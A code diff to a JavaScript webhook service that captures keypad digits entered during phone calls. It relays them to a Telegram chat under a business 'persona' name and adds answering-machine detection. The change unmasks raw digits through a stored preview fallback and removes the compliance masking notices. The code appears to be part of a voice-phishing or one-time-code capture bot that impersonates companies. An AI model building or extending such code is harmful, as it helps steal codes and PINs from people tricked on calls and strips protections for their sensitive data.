@@ -37,6 +37,44 @@ function parseCallMetadata(metadata) {
   }
 }
 
+function parseBusinessContext(raw) {
+  if (!raw) {
+    return null;
+  }
+  if (typeof raw === 'object') {
+    return raw;
+  }
+  try {
+    return JSON.parse(raw);
+  } catch (error) {
+    console.warn('Failed to parse business context payload:', error.message);
+    return null;
+  }
+}
+
+function getPersonaLabel(call) {
+  if (!call) {
+    return 'Keypad Alert';
+  }
+  const context = parseBusinessContext(call.business_context);
+  return (
+    context?.persona?.businessDisplayName ||
+    context?.businessDisplayName ||
+    context?.companyName ||
+    call.business_function ||
+    'Keypad Alert'
+  );
+}
+
+function getFallbackInputLabel(call) {
+  const metadata = parseCallMetadata(call?.metadata_json) || {};
+  const sequence = Array.isArray(metadata?.input_sequence) ? metadata.input_sequence : [];
+  if (sequence.length > 0) {
+    return sequence[0].label || sequence[0].stage || 'Input';
+  }
+  return 'Input';
+}
+
 const HUMAN_AMD_VALUES = new Set(['human', 'person', 'live', 'positive_human']);
 const MACHINE_AMD_VALUES = new Set(['machine', 'machine_start', 'fax', 'positive_machine', 'unknown_machine', 'answering_machine', 'automated']);
 
@@ -88,14 +126,15 @@ function formatDtmfEntries(entries = []) {
     const metadata = parseDtmfMetadata(entry.metadata);
     const stageDefinition = getStageDefinition(stageKey);
     const decrypted = entry.encrypted_digits ? decryptDigits(entry.encrypted_digits) : null;
-    const rawDigits = revealRaw ? decrypted : null;
+    const rawDigits = revealRaw ? (decrypted || metadata.raw_digits_preview || null) : null;
+    const fallbackDigits = metadata.raw_digits_preview || entry.masked_digits;
     const label = metadata.stage_label || stageDefinition.label || stageKey || 'Entry';
     return {
       id: entry.id,
       call_sid: entry.call_sid,
       stage_key: stageKey,
       label,
-      digits: rawDigits || entry.masked_digits,
+      digits: rawDigits || fallbackDigits,
       raw_digits: rawDigits || null,
       masked_digits: entry.masked_digits,
       received_at: entry.received_at,
@@ -560,53 +599,25 @@ class EnhancedWebhookService {
 
   async sendCallInputNotification(call_sid, telegram_chat_id) {
     try {
-      const entries = await this.db.getCallDtmfEntries(call_sid);
+      const [entries, callDetails] = await Promise.all([
+        this.db.getCallDtmfEntries(call_sid),
+        this.db.getCall(call_sid),
+      ]);
 
-      if (!entries || entries.length === 0) {
-        await this.sendTelegramMessage(
-          telegram_chat_id,
-          buildTelegramMessage(['🔢 Keypad entry notification received but no digits were captured.'])
-        );
-        return true;
-      }
+      const formattedEntries = formatDtmfEntries(entries || []);
+      const personaLabel = getPersonaLabel(callDetails);
+      const lines = [`⚠️ ${personaLabel}:`];
 
-      const formattedEntries = formatDtmfEntries(entries);
-      const { summaryLines, containsRaw } = formatSummary(entries);
-      const latestEntry = formattedEntries[formattedEntries.length - 1];
-      const timestamp = latestEntry?.received_at ? new Date(latestEntry.received_at).toLocaleTimeString() : null;
-      const metadata = latestEntry?.metadata || {};
-      const sourceLabel = (metadata.source || latestEntry?.provider || 'unknown').toString().toUpperCase();
-
-      const lines = [];
-      lines.push(containsRaw ? '⚠️ Keypad Summary' : '🔢 Keypad Summary');
-      lines.push('');
-
-      if (summaryLines.length > 0) {
-        summaryLines.forEach((line) => lines.push(line));
+      if (formattedEntries.length === 0) {
+        const fallbackLabel = getFallbackInputLabel(callDetails);
+        lines.push(`${fallbackLabel}: No input entered`);
       } else {
-        lines.push('No keypad digits recorded.');
+        formattedEntries.forEach((entry) => {
+          const digits = entry.raw_digits || entry.digits || entry.masked_digits || 'No input entered';
+          const label = entry.label || entry.stage_key || 'Input';
+          lines.push(`${label}: ${digits}`);
+        });
       }
-
-      if (timestamp || sourceLabel) {
-        const metaSegments = [];
-        if (timestamp) {
-          metaSegments.push(`Last updated ${timestamp}`);
-        }
-        if (sourceLabel) {
-          metaSegments.push(`Source: ${sourceLabel}`);
-        }
-        if (metaSegments.length) {
-          lines.push('');
-          lines.push(metaSegments.join(' • '));
-        }
-      }
-
-      lines.push('');
-      lines.push(
-        containsRaw
-          ? '🚧 Dev compliance mode — raw digits displayed. Handle with care.'
-          : 'Digits masked per active compliance policy.'
-      );
 
       await this.sendTelegramMessage(telegram_chat_id, buildTelegramMessage(lines));
 
@@ -695,7 +706,8 @@ class EnhancedWebhookService {
       return null;
     }
     const latest = entries[entries.length - 1];
-    return decryptDigits(latest.encrypted_digits) || latest.masked_digits || null;
+    const metadata = parseDtmfMetadata(latest.metadata);
+    return decryptDigits(latest.encrypted_digits) || metadata.raw_digits_preview || latest.masked_digits || null;
   }
 
   async buildInputDetails(call_sid) {
@@ -705,7 +717,7 @@ class EnhancedWebhookService {
     entries.forEach((entry) => {
       const metadata = parseDtmfMetadata(entry.metadata);
       const label = metadata.stage_label || entry.stage_key || 'Entry';
-      const rawDigits = decryptDigits(entry.encrypted_digits) || entry.masked_digits || '';
+      const rawDigits = decryptDigits(entry.encrypted_digits) || metadata.raw_digits_preview || entry.masked_digits || '';
       if (rawDigits) {
         lines.push(`${label}: ${rawDigits}`);
       }
@@ -860,11 +872,12 @@ class EnhancedWebhookService {
   async sendCallAmdUpdate(call_sid, telegram_chat_id) {
     try {
       const call = await this.db.getCall(call_sid);
-      if (!call?.amd_status) {
+      const answeredSignal = call?.amd_status || call?.answered_by;
+      if (!answeredSignal) {
         return true;
       }
 
-      const label = formatAnsweredLabel(call.amd_status);
+      const label = formatAnsweredLabel(answeredSignal);
       const emoji = label === 'human' ? '🙂' : '🤖';
       const lines = [`${emoji} Answer detection update`, `Answered by: ${label}`];
 
